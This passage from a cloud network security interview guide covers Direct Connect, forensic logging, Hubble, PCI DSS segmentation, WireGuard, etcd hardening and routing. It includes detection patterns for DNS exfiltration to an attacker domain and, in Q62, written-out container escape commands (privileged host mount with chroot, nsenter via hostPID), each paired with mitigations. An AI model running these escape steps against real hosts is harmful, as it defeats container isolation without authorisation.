10.0.0.0/16                       10.1.0.0/16
├── App Subnet                    ├── App Subnet
├── Security VPC                  ├── Security VPC
│   └── Transit GW (AWS)          │   └── Cloud VPN / Interconnect GW
│       └── Network Firewall      │       └── Firewall rules (hierarchical)
└── VPN GW ←── IPsec ──────────→ └── Cloud VPN GW
```

**Security controls:**

1. **Encrypt all inter-cloud traffic** — IPsec tunnel with IKEv2, AES-256-GCM, ECDHE.
2. **Route control** — advertise only necessary subnets over the tunnel. BGP prefix filtering on both sides. Never advertise `0.0.0.0/0` across the tunnel.
3. **Centralized inspection** — route inter-cloud traffic through an inspection VPC/VNet (Network Firewall, Palo Alto) before it reaches workloads on either side.
4. **Identity federation** — use OIDC/SAML federation for workload identity (GCP Workload Identity Federation accepting AWS STS tokens) so AWS services can call GCP APIs without static keys.
   ```bash
   # GCP Workload Identity Federation — trust AWS IAM role
   gcloud iam workload-identity-pools providers create-aws my-aws-provider \
     --workload-identity-pool=my-pool \
     --account-id=123456789012 \
     --location=global
   ```
5. **DNS isolation** — maintain separate DNS zones. Don't expose internal DNS between clouds without explicit need.
6. **Monitoring** — deploy a unified SIEM (Splunk, Elastic, Chronicle) collecting CloudTrail, GCP Audit Logs, VPC Flow Logs, and GCP VPC Flow Logs. Correlation rules for cross-cloud lateral movement.

---

### Q42. Explain AWS Direct Connect. How does it differ from a VPN? What are its security properties?

**Core Concept:** Dedicated private network connectivity to AWS; security vs. VPN comparison.

**Answer:**

**AWS Direct Connect (DX):** A dedicated, private network connection from your data center/colo to AWS. Physical fiber from your facility to an AWS DX location (or via partner).

**How it works:**
1. You order a DX Connection (1Gbps, 10Gbps, 100Gbps) or use a DX Partner for sub-1Gbps hosted connections.
2. Cross-connect at the DX location (Equinix, CoreSite, etc.) between your router and AWS's DX router.
3. BGP session established between your CE (Customer Edge) router and AWS (ASN 7224).
4. Create **Virtual Interfaces (VIFs):**
   - **Private VIF** — connects to a VPC via a VGW. Routes to VPC private IP space.
   - **Public VIF** — access to AWS public services (S3, DynamoDB) using public IPs, over private connection.
   - **Transit VIF** — connects to a DX Gateway, which connects to Transit Gateways.

**DX vs. VPN comparison:**

| Dimension | Direct Connect | Site-to-Site VPN |
|---|---|---|
| **Path** | Dedicated fiber (private, no internet) | Over public internet |
| **Encryption** | Not encrypted by default | IPsec encrypted |
| **Bandwidth** | 1/10/100 Gbps, consistent | Variable, up to ~1.25 Gbps |
| **Latency** | Low, consistent | Variable (internet) |
| **Availability** | Single DX = no redundancy; need 2 DX for HA | Multi-tunnel VPN is inherently redundant |
| **Setup time** | Weeks to months | Minutes |
| **Cost** | High (port + data transfer) | Low |
| **Use case** | High bandwidth, consistent, regulated | Backup, low bandwidth, quick setup |

**Security properties of Direct Connect:**

1. **No encryption by default:** Traffic on DX is plaintext on the private fiber. An attacker with physical access to the fiber or the AWS DX facility could intercept traffic.
   **Mitigation:** Run **MACsec (802.1AE)** on dedicated DX connections (1/10/100Gbps) — Layer 2 encryption with 256-bit AES-GCM between your router and AWS router. Or run IPsec VPN **over** the DX connection for defense-in-depth.

2. **MACsec configuration:**
   ```bash
   aws directconnect create-mac-sec-key --connection-id dxcon-xxx \
     --secret-arn arn:aws:secretsmanager:...
   ```

3. **BGP security:** Use MD5 authentication on the BGP session. Consider implementing RPKI on your side. AWS doesn't accept routes longer than /24 (IPv4) over DX.

4. **Blast radius isolation:** Use separate VIFs per environment (prod DX, dev DX) to prevent a compromised dev environment from routing to prod over DX.

5. **DX Gateway isolation:** A DX Gateway can connect to multiple VGWs/TGWs. Carefully control which VPCs are associated — a misconfiguration can create unintended connectivity between accounts.

---

## Section 14: Observability & Forensics

---

### Q43. What logs and signals are essential for cloud network security forensics? How do you detect lateral movement?

**Core Concept:** Log sources; SIEM correlation; lateral movement detection patterns.

**Answer:**

**Essential log sources:**

| Log Source | What it captures | Retention |
|---|---|---|
| **VPC Flow Logs** | IP-level traffic (src/dst IP, port, protocol, bytes, action) | 90 days → S3 |
| **CloudTrail** | AWS API calls (who did what, when, from where) | 90 days → S3 (indefinite) |
| **ALB Access Logs** | HTTP request details (URL, user-agent, latency, response code) | S3 |
| **WAF Logs** | Rule matches, blocked requests | CloudWatch / Kinesis |
| **DNS Query Logs** | Route 53 Resolver DNS queries from VPC | CloudWatch |
| **CloudWatch Logs** | Application logs, ECS/EKS container logs | 1 year+ |
| **GuardDuty Findings** | ML-based threat detection results | EventBridge |
| **Network Firewall Logs** | Firewall rule matches (alert, drop) | CloudWatch / S3 |
| **S3 Access Logs / Data Events** | Object-level access (GetObject, PutObject) | S3 |
| **KMS CloudTrail** | Every Decrypt/GenerateDataKey call | CloudTrail |

**Lateral movement detection patterns:**

1. **Internal port scanning:**
   - VPC Flow Logs: single source IP → many destination IPs on same port (e.g., 22, 3389, 3306).
   - Pattern: `src=10.0.1.50, dst_port=22, action=REJECT` repeated across 50+ destinations in 60 seconds.
   - GuardDuty: `Recon:EC2/Portscan` finding.

2. **East-West traffic anomaly:**
   - Baseline: service A talks to service B on port 8080.
   - Alert: service A suddenly connects to service C on port 5432 (database) — never seen before.
   - Requires baselining normal traffic patterns.

3. **Credential usage from unusual location:**
   - CloudTrail: IAM role used from a new IP/region/UserAgent.
   - Alert: EC2 role credentials used from a Lambda (different service endpoint).

4. **IMDS credential exfiltration followed by unusual API calls:**
   - EC2 instance calls `GetObject` on S3 bucket it never accessed before.
   - Pattern: `ec2:DescribeInstances` from within the VPC (attacker enumerating).

5. **DNS exfiltration:**
   - Route 53 Resolver logs: high volume of queries to random subdomains of an external domain.
   - Pattern: `a1b2c3.exfil.attacker.com`, `d4e5f6.exfil.attacker.com` — base64 encoded data.

**Detection query (Athena on VPC Flow Logs — port scanning):**
```sql
SELECT srcaddr, COUNT(DISTINCT dstaddr) AS unique_destinations,
       COUNT(*) AS connection_attempts
FROM vpc_flow_logs
WHERE action = 'REJECT'
  AND protocol = 6
  AND start > to_unixtime(now() - interval '5' minute)
GROUP BY srcaddr
HAVING COUNT(DISTINCT dstaddr) > 20
ORDER BY unique_destinations DESC;
```

---

### Q44. Explain eBPF-based network observability with Cilium Hubble. How does it compare to traditional flow logging?

**Core Concept:** L7 flow visibility; identity-based flows; Hubble architecture.

**Answer:**

**Traditional flow logging (VPC Flow Logs, netflow, sflow):**
- L3/L4 only: src IP, dst IP, port, protocol, bytes, packets.
- No application context — cannot distinguish HTTP GET from HTTP POST.
- No service identity — only IP addresses (which change with pod restarts).
- Logs written asynchronously; potential for gaps during high traffic.
- Sampling (sflow) may miss short-lived connections.

**Hubble (Cilium's observability layer):**
Hubble observes all network flows from within the kernel via eBPF programs attached to each pod's network interface. Because Cilium is also the CNI, it has full context: Kubernetes metadata, service identity, and L7 protocol details.

**What Hubble sees:**
```
Flow: {
  source: {pod: "payments-7d4f9/payments-api", namespace: "payments",
           identity: 1234, labels: {app: payments-api}},
  destination: {pod: "inventory-5c8b2/inventory-service", namespace: "inventory",
                identity: 5678},
  l4: {tcp: {source_port: 54123, destination_port: 8080}},
  l7: {http: {method: "POST", url: "/api/v1/charge", status_code: 200,
              latency_ns: 4500000}},
  verdict: FORWARDED,
  timestamp: "2024-01-15T10:23:45.123456789Z"
}
```

**Hubble CLI:**
```bash
# Live flow observation
hubble observe --follow --namespace payments

# Filter by identity (not IP)
hubble observe --from-label app=payments-api --to-label app=inventory-service

# Filter by HTTP verdict
hubble observe --verdict DROPPED --protocol HTTP

# L7 HTTP flows
hubble observe --namespace payments --protocol HTTP --http-method POST

# Export for SIEM
hubble observe -o json | jq . | send_to_siem
```

**Hubble network policy troubleshooting:**
```bash
# See why a connection is being dropped — shows policy rule that dropped it
hubble observe --verdict DROPPED --from-pod payments/payments-api -o json | \
  jq '.flow.drop_reason_desc'
```

**Architecture:**
```
Hubble Agent (per node, runs inside Cilium agent)
├── Reads eBPF ring buffer (flow events from kernel)
├── Enriches with k8s metadata (pod name, labels, namespace)
└── Exposes gRPC API (Hubble Observer API)

Hubble Relay
└── Aggregates from all node agents → single cluster-wide view

Hubble UI (web dashboard)
└── Flow visualization, service map, policy editor
```

**Security advantages over traditional logs:**
1. **Cannot be bypassed** — eBPF programs in kernel; compromised pods cannot suppress their flows.
2. **Identity-based** — flows annotated with workload identity, not just IP (survives pod churn).
3. **L7 visibility without MitM** — HTTP, DNS, Kafka, gRPC visibility without intercepting TLS (for unencrypted internal traffic or after mTLS termination).
4. **Real-time** — sub-millisecond observation vs. VPC Flow Logs 1-minute aggregation windows.

---

## Section 15: Compliance & Regulatory

---

### Q45. How do you implement network segmentation for PCI DSS compliance in a cloud environment?

**Core Concept:** PCI DSS scope reduction; CDE isolation; compensating controls.

**Answer:**

**PCI DSS v4.0 Network Segmentation goals:**
Reduce the scope of the Cardholder Data Environment (CDE) by isolating systems that store, process, or transmit cardholder data from systems that do not.

**Segmentation principles:**
1. **CDE systems** must be isolated such that systems out-of-scope cannot communicate with them without passing through security controls that are themselves in scope.
2. Segmentation must be tested annually (and after changes) with penetration testing.
3. All access to the CDE must be authenticated, authorized, and logged.

**AWS implementation:**

```
VPC: pci-vpc (10.0.0.0/16)
├── Subnet: cde-subnet-1 (10.0.1.0/24) — AZ-1  [RESTRICTED]
│   ├── Payment processor EC2 / ECS tasks
│   └── Security controls: SG, NACL, Network Firewall, VPC Flow Logs
├── Subnet: cde-subnet-2 (10.0.2.0/24) — AZ-2  [RESTRICTED]
├── Subnet: inspection (10.0.3.0/24)
│   └── AWS Network Firewall (stateful NGFW)
└── Subnet: mgmt (10.0.4.0/24)
    └── Bastion (with MFA, PAM — CyberArk, HashiCorp Boundary)

VPC: app-vpc (10.1.0.0/16) [OUT OF SCOPE]
└── All non-CDE application components

Transit Gateway:
└── Routes between app-vpc and pci-vpc MUST pass through inspection subnet
    └── TGW route table: app-vpc → inspection VPC → CDE
```

**Requirement 1 (Network Security Controls) — PCI DSS v4.0:**
```bash
# Requirement 1.3.2: Deny all traffic not explicitly permitted
# NACL: Explicit deny-all as last rule
aws ec2 create-network-acl-entry --network-acl-id acl-xxx \
  --rule-number 32767 --protocol -1 --rule-action deny \
  --cidr-block 0.0.0.0/0 --egress

# Security Groups: Default deny — document every allowed rule with business justification
# Tag each SG rule with Jira ticket / change management reference
```

**Requirement 4 (Encryption of CHD in transit):**
- Enforce TLS 1.2+ for all connections involving CHD.
- Disable TLS 1.0 and 1.1 at ALB: `aws elbv2 create-listener --ssl-policy ELBSecurityPolicy-TLS13-1-2-2021-06`
- mTLS for service-to-service calls within CDE.

**Requirement 10 (Audit Logs):**
- CloudTrail with CloudWatch Alarms for: failed logins, SG rule changes, NACL changes, route table changes.
- VPC Flow Logs for CDE subnets with 1-year retention in S3 (WORM via Object Lock).
- Centralized SIEM with immutable storage.

**Requirement 11.4 (Penetration Testing):**
- Annual segmentation test: attempt to reach CDE from out-of-scope systems.
- Document methodology, results, remediation.

**Key PCI DSS v4 changes:**
- Requirement 8: Multi-factor authentication required for ALL access to CDE (not just non-console administrative access).
- Requirement 6.4: WAF required for all public-facing web applications in CDE scope.

---

### Q46. What is the AWS Shared Responsibility Model? Where does it create security gaps?

**Core Concept:** Cloud provider vs. customer security boundaries; common misunderstandings.

**Answer:**

**The model:**
- **AWS is responsible for:** Security **of** the cloud — physical data centers, hardware, hypervisor, managed services' infrastructure, global network.
- **Customer is responsible for:** Security **in** the cloud — data, IAM, OS patches, network configuration, application security, encryption.

**Responsibility split by service type:**

| Responsibility | IaaS (EC2) | PaaS (RDS, Lambda) | SaaS (S3) |
|---|---|---|---|
| Physical security | AWS | AWS | AWS |
| Hypervisor | AWS | AWS | AWS |
| OS | **Customer** | AWS | AWS |
| Middleware/Runtime | **Customer** | AWS | AWS |
| Application | **Customer** | **Customer** | N/A |
| Data | **Customer** | **Customer** | **Customer** |
| IAM/Access control | **Customer** | **Customer** | **Customer** |
| Network config | **Customer** | **Customer** | **Customer** |
| Encryption at rest | **Customer** | **Customer** | **Customer** |

**Security gaps and common misunderstandings:**

1. **S3 public bucket exposure:** AWS manages S3 infrastructure security. Customer is responsible for bucket policies. "S3 is secure" ≠ "My data in S3 is secure." Thousands of breaches from public bucket misconfiguration.
   - Mitigation: S3 Block Public Access at account level, AWS Config rule `s3-bucket-public-read-prohibited`.

2. **RDS networking:** AWS manages the RDS engine patches and availability. Customer is responsible for SG rules, VPC placement, encryption, and whether the instance is publicly accessible.
   - `PubliclyAccessible: true` = RDS has a public endpoint. Customer must ensure SGs restrict access.

3. **IAM is entirely customer responsibility:** AWS does not audit your IAM policies. Over-permissive policies, unused roles, no MFA = customer's security failure.

4. **EKS node groups:** AWS manages the EKS control plane. Customer manages worker node OS, kubelet config, container runtime, and all workload security.

5. **Lambda:** AWS manages the execution environment. Customer is responsible for: function code vulnerabilities, IAM role permissions, environment variables containing secrets (use Secrets Manager instead), and VPC configuration.

6. **Encryption:** AWS offers encryption capabilities (KMS, SSE-S3, SSE-KMS) but enabling them is the customer's responsibility. Data in transit encryption between EC2 instances within a VPC is NOT automatically encrypted by AWS (some documentation incorrectly implies this).

---

### Questions 47-100: Rapid-Deep Format

---

### Q47. What is DNSSEC and how does it work?

DNSSEC (RFC 4033-4035) adds cryptographic signatures to DNS records, enabling resolvers to verify that responses haven't been tampered with. Each DNS zone signs its records using asymmetric cryptography:
- **RRSIG records** — digital signatures for each record set.
- **DNSKEY** — public key for the zone (ZSK and KSK).
- **DS records** — hash of the child zone's KSK, stored in the parent zone (chain of trust from root).
- **NSEC/NSEC3** — authenticated denial of existence (prove a domain doesn't exist without lying).

**Limitation:** DNSSEC validates data integrity and authenticity but does NOT encrypt DNS queries (use DoT/DoH for that). **Key signing ceremony** for root zone involves physical air-gapped HSMs; Root Zone KSK rollover (first in 2018) required coordination with all resolvers.

---

### Q48. What is a SYN flood and how does SYN cookies work?

**SYN flood:** Attacker sends millions of TCP SYN packets (often spoofed source IPs). Server allocates a `SYN_RECEIVED` state entry in the TCB (Transmission Control Block) for each. The half-open connection table (backlog) fills up; legitimate new connections are dropped.

**SYN cookies mitigation (`net.ipv4.tcp_syncookies=1`):**
Server encodes connection state into the ISN (Initial Sequence Number) of the SYN-ACK:
```
ISN = H(src_ip, src_port, dst_ip, dst_port, t) XOR MSS_encoding
```
Where `H` is a keyed hash (using a secret key). No state stored on server. When ACK arrives, server reconstructs the state from the sequence number and verifies the hash. Only legitimate clients (who received the SYN-ACK) can complete the handshake. **Trade-off:** TCP options (SACK, window scaling) are lost with SYN cookies.

---

### Q49. Explain OSPF vs BGP. When is each used in data center environments?

**OSPF (Open Shortest Path First):** Link-state protocol. Each router has a complete topology map (LSDB). Dijkstra algorithm computes shortest paths. Converges fast (sub-second with BFD). **Use:** Within a data center or campus — intra-AS routing, IGP for data center fabric (spine-leaf). Supports areas (area 0 = backbone).

**BGP:** Path-vector protocol. Scales to internet size. Policy-rich (route maps, communities, MED, LOCAL_PREF). Slow convergence by default (but tuneable with BFD). **Use:** Inter-AS routing, data center edge to ISP, cloud provider peering, and increasingly intra-DC (BGP in the data center — RFC 7938) for large spine-leaf fabrics.

**Data center trend:** BGP-only data center (Cumulus, Arista, Cisco) — BGP used as both IGP (iBGP between spines/leaves) and EGP (eBGP to ISPs). Simplifies the network (one protocol), enables per-link ECMP, scales beyond OSPF's area limitations.

---

### Q50. What is SR-IOV? How does it relate to network performance in virtualized environments?

**SR-IOV (Single Root I/O Virtualization, PCI-SIG spec):** Allows a single physical PCIe device (NIC) to appear as multiple separate PCIe devices to VMs. Creates:
- **PF (Physical Function)** — full NIC managed by hypervisor.
- **VFs (Virtual Functions)** — lightweight PCIe instances with dedicated transmit/receive queues.

VMs with SR-IOV access a VF directly (via IOMMU/VFIO) — bypassing the hypervisor for data plane operations. This achieves near-native (≈ wire-speed) throughput and microsecond latency.

**Security consideration:** SR-IOV bypasses the hypervisor for data plane. Security enforcement (firewalling, traffic shaping) must happen in the NIC firmware or the physical switch, not the hypervisor. AWS Enhanced Networking (ENA) and Intel X520/X710 NICs support SR-IOV. With SR-IOV, the IOMMU must be enabled and properly configured to prevent DMA attacks from VFs accessing other VMs' memory.

---

### Q51. What is DPDK? How does it differ from kernel networking?

**DPDK (Data Plane Development Kit):** Userspace framework for high-speed packet processing, bypassing the Linux kernel networking stack.

**Kernel networking path:** `NIC → DMA → sk_buff allocation → kernel TCP stack → syscall → userspace application`. Multiple context switches, kernel/userspace data copies.

**DPDK path:** `NIC → DMA (PMD - Poll Mode Driver) → DPDK mbuf (userspace memory) → application`. No syscalls, no interrupts (polling), huge pages for DMA, zero-copy between NIC and application.

**Performance:** Achieves 10-100 Gbps per core on commodity hardware. Used in: VPP (Vector Packet Processing), OVS-DPDK (Open vSwitch), network functions (firewalls, load balancers, 5G UPF).

**Security implications:** DPDK processes run as root (or with `CAP_NET_ADMIN + huge pages`). A DPDK application compromise = full network access. Isolation requires VM-level or container-level separation. Memory safety (prefer Rust bindings like `dpdk-sys`) is critical.

---

### Q52. How does NAT64 and DNS64 work? Why is it relevant in IPv6 transition?

**NAT64 (RFC 6146):** Allows IPv6-only clients to communicate with IPv4-only servers. A NAT64 gateway synthesizes IPv6 addresses for IPv4 destinations (using a well-known prefix `64:ff9b::/96`). When the IPv6 client sends to `64:ff9b::192.0.2.1`, the NAT64 gateway translates the packet to IPv4.

**DNS64 (RFC 6147):** When an AAAA query returns no result (IPv4-only server), DNS64 synthesizes a AAAA record using the NAT64 prefix: `AAAA = 64:ff9b:: + IPv4_address`.

**Relevance:** AWS VPCs can be IPv6-enabled (dual-stack or IPv6-only). IPv6-only subnets reduce public IPv4 dependency (IPv4 exhaustion). NAT64/DNS64 enables IPv6-only EC2 instances to reach AWS services that are still IPv4-only.

**Security consideration:** NAT64 changes the network topology; IPv6 traffic bypasses IPv4 ACLs. Ensure firewall rules cover both IPv4 and IPv6 stacks. AWS Security Groups apply to both; but NACLs are separate for IPv4 and IPv6.

---

### Q53. What is anycast routing and how is it used for CDN and DDoS mitigation?

**Anycast:** Same IP prefix announced from multiple geographically distributed points of presence (PoPs). BGP routing directs each user to the nearest PoP (based on shortest AS path or lowest MED). Multiple servers share the same IP address.

**CDN use (Cloudflare, Fastly, CloudFront):** User's DNS resolves to an anycast IP. Traffic routed to nearest CDN edge PoP. Reduces latency (content served from nearby cache) and distributes load globally.

**DDoS mitigation:** A volumetric DDoS attack targeting an anycast IP is naturally distributed across all PoPs — a 1 Tbps attack is spread across 200 PoPs = 5 Gbps per PoP (manageable). Cloudflare's network capacity exceeds attack volumes for most adversaries.

**Limitation:** Anycast is not suitable for stateful TCP services without session affinity mechanisms — different packets in the same flow may be routed to different PoPs. Anycast + UDP (DNS) is natural; anycast + TCP requires careful implementation (ECMP within PoP, Maglev for session affinity).

---

### Q54. Explain the concept of Network Address Translation (NAT) types: SNAT, DNAT, PAT/NAPT, and their security implications.

**SNAT (Source NAT):** Replaces source IP (and optionally port) of outbound packets. Used for private-to-public internet access (AWS NAT Gateway, Linux MASQUERADE). Hides internal topology. **Security implication:** All hosts behind SNAT appear as a single IP; blocks inbound-initiated connections naturally; makes forensics harder (must correlate connection tracking logs with internal IP).

**DNAT (Destination NAT):** Replaces destination IP (and optionally port) of inbound packets. Used for port forwarding, load balancing. AWS ALB/NLB use DNAT to distribute traffic to backend pods. **Security implication:** Exposes an internal service on a public IP/port; security depends entirely on the DNAT rule being correct (wrong DNAT rule = wrong service exposed).

**PAT/NAPT (Port Address Translation):** Many-to-one NAT — multiple private IPs share one public IP, differentiated by source port. Standard home router / AWS NAT Gateway behavior. **Port exhaustion** is a real failure mode — 65,535 ports per source IP per destination; high-connection workloads can exhaust the port table. AWS NAT Gateway scales automatically but charges per connection.

**CGNAT (Carrier-Grade NAT):** ISPs run NAT for IPv4 conservation. Customers share a single public IP with thousands of others. Breaks end-to-end connectivity; breaks IP-based blocklisting (innocent users blocked due to shared IP reputation); breaks peer-to-peer.

---

### Q55. How does WireGuard work? Compare it to OpenVPN and IPsec for cloud VPN use cases.

**WireGuard (RFC-like, Linux 5.6+):** A modern, kernel-integrated VPN protocol designed for simplicity (≈4000 lines of code vs. hundreds of thousands for IPsec/OpenVPN).

**Cryptographic primitives (fixed, non-negotiable):**
- Key exchange: Curve25519 ECDH.
- Symmetric encryption: ChaCha20-Poly1305 (AEAD).
- Hashing: BLAKE2s, SipHash2-4.
- Handshake: Noise_IKpsk2 protocol.

**Security properties:**
- **Cryptoagility-free** — no cipher negotiation; the fixed cipher suite eliminates downgrade attacks.
- **Perfect Forward Secrecy** — ephemeral Curve25519 key pairs per session.
- **Silent operation** — no response to unauthenticated packets (cannot distinguish WireGuard from random UDP noise without knowing the public key).
- **Identity hiding** — initiator identity is encrypted.

| Dimension | WireGuard | OpenVPN | IPsec (IKEv2) |
|---|---|---|---|
| **Kernel integration** | Yes (kernel 5.6+) | Userspace (TUN/TAP) | Kernel (via kernel modules) |
| **Performance** | Excellent (kernel bypass) | Moderate | Good |
| **Config complexity** | Simple (key pairs only) | Complex (PKI, options) | Complex |
| **Cryptoagility** | None (secure by design) | High (many options) | High |
| **FIPS compliance** | No (ChaCha20 not in FIPS) | Possible (OpenSSL) | Yes |
| **Enterprise PKI** | Limited | Yes (TLS/PKI) | Yes (IKEv2 + certs) |
| **Roaming support** | Excellent (MOBIKE-like) | Moderate | Yes (MOBIKE) |

**Cloud use cases:** Kubernetes node-to-node encryption (Cilium WireGuard mode), developer remote access (Tailscale, Netbird), multi-site VPN on bare-metal or cloud instances. For FIPS environments, use IPsec/IKEv2 instead.

---

### Q56. What is a Bastion Host / Jump Server? What is Zero Trust Network Access (ZTNA) and why does it replace bastions?

**Bastion Host:** A hardened server in a public subnet used as a hop point for SSH/RDP access to private resources. Reduces attack surface to a single entry point. Weaknesses: SSH key management, shared credentials, no fine-grained access control, logs all SSH traffic but application-level actions in sessions are not logged, long-lived access.

**ZTNA (Zero Trust Network Access):** Identity-aware access proxy that grants per-application, per-session access based on user identity, device health, and context — without exposing the network. Examples: Cloudflare Access, Zscaler Private Access, HashiCorp Boundary.

**HashiCorp Boundary:** Open-source ZTNA:
```bash
# Create target for RDS
boundary targets create tcp \
  --name "prod-db" \
  --default-port 5432 \
  --scope-id p_xxx

# Connect (authenticated, session recorded)
boundary connect postgres -target-id ttcp_xxx \
  -dbname mydb -- -U admin
```

**ZTNA advantages over bastion:**
- No need to open SSH ports to bastion; no bastion to patch.
- Per-resource access (not full network access).
- Session recording for audit.
- MFA enforced per connection.
- Dynamic credentials (Vault integration — no static DB passwords).
- Short-lived sessions.

---

### Q57. Explain Kubernetes Ingress vs. Gateway API. What are the security differences?

**Ingress (v1 stable):** L7 HTTP/HTTPS routing based on host and path. Implemented by Ingress Controllers (nginx, Traefik, AWS ALB Controller). Limitations: limited expressiveness, vendor-specific annotations for advanced features, single namespace scope (cross-namespace issues).

**Gateway API (CNCF, beta → stable in 1.28+):** Successor to Ingress. Four resources:
- `GatewayClass` — defines the controller implementation.
- `Gateway` — defines the listener (port, TLS, protocol). Managed by infrastructure team.
- `HTTPRoute` — defines routing rules (path, header matching, weights). Managed by app teams.
- `ReferenceGrant` — explicit permission for cross-namespace references.

**Security improvements in Gateway API:**
1. **Role separation** — GatewayClass and Gateway are cluster/infra team resources; HTTPRoute is app team resource. RBAC aligns with organizational boundaries.
2. **ReferenceGrant** — cross-namespace secret references require explicit opt-in from the target namespace.
3. **TLS configuration** — more expressive TLS policy attachment (TLSRoute, certificate references).
4. **Traffic splitting** — native weight-based splitting (canary) without annotations.
5. **Conformance testing** — implementations must pass conformance tests, reducing vendor-specific security surprises.

---

### Q58. What is EBGP multihop and when is it used? What are the security implications?

**eBGP (External BGP)** by default requires that BGP peers be directly connected (TTL=1 — only directly adjacent hops). **eBGP multihop** (`ebgp-multihop N`) increases the TTL, allowing eBGP sessions between non-adjacent routers.

**Use cases:**
- Peering with a route reflector or BGP monitor that isn't directly connected.
- Peering with a loopback address (for redundancy across multiple physical links).
- AWS Direct Connect: BGP session over a virtual interface where peering IP may be several hops away.
- Kubernetes: Calico BGP peering between pods and upstream routers.

**Security implications:**
- Bypasses the GTSM (Generalized TTL Security Mechanism, RFC 5082) defense. Normally, TTL=255 at origin and TTL must be ≥254 at receiver; packets originating off-link have TTL < 254 and are dropped. eBGP multihop disables this.
- Increases the attack surface for BGP session injection from non-directly-connected attackers.
- Mitigate with: MD5 authentication on the BGP session, strict IP prefix filtering for allowed peer addresses, firewall rules restricting TCP/179 to known peer IPs.

---

### Q59. How do you secure Kubernetes etcd? What is the impact of etcd compromise?

**etcd** is Kubernetes's distributed key-value store containing ALL cluster state: secrets, configs, pod specs, service accounts, RBAC policies, certificates.

**Impact of etcd compromise:** Complete cluster compromise. Attacker can:
- Read all Kubernetes Secrets (including service account tokens, TLS private keys stored in Secrets).
- Write arbitrary pod specs → deploy privileged pods → node escape.
- Modify RBAC → grant themselves cluster-admin.
- Extract kubeconfig secrets for all service accounts.

**Hardening:**
```bash
# 1. TLS client authentication — etcd requires client cert for all connections
# kube-apiserver connects to etcd with its own client cert
--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key

# 2. etcd peer TLS (cluster members authenticate to each other)
--peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt
--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
--peer-client-cert-auth=true

# 3. Encryption at rest (kube-apiserver encrypts secrets before storing in etcd)
# EncryptionConfiguration:
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources: [secrets]
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-32-byte-key>
  - identity: {}

# 4. Network isolation — etcd should only be reachable from kube-apiserver nodes
# Firewall rules: only allow TCP/2379 (client) and TCP/2380 (peer) from API server IPs
iptables -A INPUT -p tcp --dport 2379 -s <apiserver-ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 2379 -j DROP

# 5. Regular backups with encryption
etcdctl snapshot save /backup/etcd-snapshot.db
# Encrypt backup with AWS KMS before storing in S3
```

**Audit:** Check that etcd is NOT accessible from worker nodes or external IPs. `nmap -p 2379 <etcd-ip>` from a worker node should timeout.

---

### Q60. What is Open Policy Agent (OPA)? How do you use it for cloud network security policy?

**OPA (Open Policy Agent):** A general-purpose policy engine that decouples policy from business logic. Policies written in **Rego** (declarative language). Accepts JSON input, returns JSON decision.

**Rego policy — deny pod with hostNetwork:**
```rego
package kubernetes.admission

deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.object.spec.hostNetwork == true
  msg := sprintf("Pod %v must not use hostNetwork", [input.request.object.metadata.name])
}

deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  container.securityContext.privileged == true
  msg := sprintf("Container %v must not be privileged", [container.name])
}
```

**OPA Gatekeeper (Kubernetes admission controller):**
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPHostNetworkingPorts
metadata:
  name: psp-host-network-ports
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    hostNetwork: false
```

**Network security use cases for OPA:**
1. **Terraform plan validation** — evaluate Terraform plan JSON before apply; deny if SG allows `0.0.0.0/0` on port 22.
2. **Kubernetes admission** — reject pods that would create excessive network exposure.
3. **API gateway authorization** — OPA as external authorizer for Envoy/Istio (ext_authz).
4. **CI/CD pipeline gates** — block IaC deployments that violate network security policy.

---

### Q61. How does the Linux routing table work? Explain the `ip route` command and policy routing.

**Linux routing table:** The kernel uses the routing table to decide where to forward packets. Each entry: destination prefix + next-hop (gateway) + output interface + metrics.

```bash
# View main routing table
ip route show table main
# 10.0.0.0/8 via 10.0.0.1 dev eth0 proto bgp metric 20
# 172.16.0.0/12 dev eth1 proto kernel scope link src 172.16.0.1

# Add a route
ip route add 192.168.100.0/24 via 10.0.0.1 dev eth0

# Default route (0.0.0.0/0)
ip route add default via 10.0.0.1

# Check route for specific destination
ip route get 8.8.8.8
# 8.8.8.8 via 10.0.0.1 dev eth0 src 10.0.1.50 uid 0
```

**Routing table lookup order:**
1. Exact match (longest prefix match — LPM).
2. The kernel uses multiple routing tables (0-255). Default: `local` (255), `main` (254), `default` (253).

**Policy Routing (ip rule):**
Route based on source IP, destination IP, TOS, fwmark — not just destination:
```bash
# Route traffic from 192.168.1.0/24 out a different gateway (table 100)
ip rule add from 192.168.1.0/24 lookup 100
ip route add table 100 default via 10.0.1.1 dev eth1

# Route traffic marked by iptables (e.g., from specific processes) via VPN
iptables -t mangle -A OUTPUT -m owner --uid-owner vpnuser -j MARK --set-mark 1
ip rule add fwmark 1 lookup 200
ip route add table 200 default via 10.8.0.1 dev tun0
```

**Kubernetes relevance:** Cilium and Calico use policy routing (ip rules + ip route tables) extensively to implement pod routing, service DNAT, and NodePort handling without relying entirely on iptables.

---

### Q62. What is container escape? Describe 3 attack techniques and mitigations.

**Container escape:** Breaking out of the container's namespace isolation to gain access to the host.

**1. Privileged container:**
```bash
# Privileged container has all capabilities and can mount host filesystem
docker run --privileged ubuntu
# Inside container:
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host  # Now in host filesystem
```
**Mitigation:** Never run privileged containers. Enforce via OPA Gatekeeper, Kyverno, or Pod Security Standards (`restricted` profile). Use `securityContext.allowPrivilegeEscalation: false`.

**2. hostPID + process injection:**
```bash
# Container with hostPID sees all host processes
docker run --pid=host ubuntu
# nsenter into host process namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now in host namespaces
```
**Mitigation:** Prohibit `hostPID: true`, `hostIPC: true`, `hostNetwork: true`. PSS `restricted` profile blocks these.

**3. Mounted Docker socket:**
```bash
